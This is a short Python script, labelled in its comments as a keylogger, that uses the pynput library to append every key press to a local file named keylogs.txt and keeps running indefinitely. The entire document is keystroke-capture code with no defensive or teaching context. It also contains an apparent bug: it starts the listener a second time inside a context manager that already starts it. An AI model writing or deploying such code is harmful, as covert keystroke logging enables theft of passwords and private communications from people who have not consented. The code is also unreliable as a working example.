from pynput.keyboard import Key, Listener
import time

# Function to log the keys
def log_key(key):
    with open("keylogs.txt", "a") as log_file:
        log_file.write(f'{key}\n')

# Start the keylogger
with Listener(on_press=log_key) as listener:
    listener.start()
    while True:  # Keep the script running
        time.sleep(10)  # Sleep to avoid high CPU usage
